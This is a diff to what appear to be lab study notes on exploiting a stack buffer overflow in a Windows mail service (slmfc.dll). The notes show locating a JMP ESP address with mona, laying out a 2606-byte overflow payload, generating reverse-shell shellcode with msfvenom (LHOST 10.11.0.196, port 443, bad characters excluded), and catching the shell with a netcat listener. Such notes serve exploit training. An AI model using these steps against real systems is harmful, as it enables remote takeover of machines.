@@ -407,45 +407,30 @@ nasm > jmp esp
 
 !mona find -s "\xff\xe4" -m slmfc.dll
 
+We can see many addresses that contain \xff\xe4 (JMP ESP).
+We just need to include this in our payload and make the EIP to contain 
+one of these addresses. Since ESP will contain an address that points right after into our payload (payload offset right after the EIP). So basically our payload:
 
+'A' * 2606 + 'AddressToJMPESP' + 'SHELLCODE'
 
+Shellcode generation
+--------------------
 
+$ msfvenom -p windows/shell_reverse_tcp -f python
 
+But need to specify the bad chars in the above script! (0, \n, \r)
 
+$ msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.196 LPORT=443 EXITFUNC=thread -f python -a x86 --platform windows -b "\x00\x0a\x0d"
 
+EXITFUNC param ensures that the exploited program does not crash by terminating just the thread.
+The shellcode is encoded. The decoder part will use the ESP which points to our code so we have to provide some stack space for the decoder to sue otherwise it will overwrite our shellcode rendering it useless.
 
+We can add NOPs at the beginning of our shellcode.
 
+We should add some NOPs after the EIP and right before the actual generated shellcode.
 
+$ nc -nlp 443
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+We should receive the connection from the victim.
 
 
